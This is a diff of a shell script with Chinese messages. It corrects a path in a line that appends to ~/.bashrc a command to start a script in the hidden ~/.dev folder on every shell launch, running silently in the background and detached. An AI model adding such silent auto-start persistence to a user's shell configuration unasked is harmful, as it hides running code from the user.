@@ -53,7 +53,7 @@ if [ -d .dev ]; then
     echo "目录已成功移动。"
     echo "正在配置环境变量..."
     if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
-        echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /.dev/null &) & disown" >> ~/.bashrc
+        echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
         echo "配置已添加到 .bashrc。"
     else
         echo "配置已存在，跳过。"
